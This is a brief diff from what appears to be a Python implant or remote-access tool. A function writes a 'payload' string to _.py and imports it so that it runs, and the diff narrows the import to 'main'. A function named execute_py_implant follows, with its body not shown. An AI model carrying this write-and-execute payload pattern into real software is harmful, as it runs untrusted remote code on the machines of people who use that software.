@@ -21,7 +21,7 @@ def ondisk_py():
     global payload
     with open("_.py",'w') as file:
         file.write(payload)
-    from _ import *
+    from _ import main
     return ""
 
 def execute_py_implant(url,session):
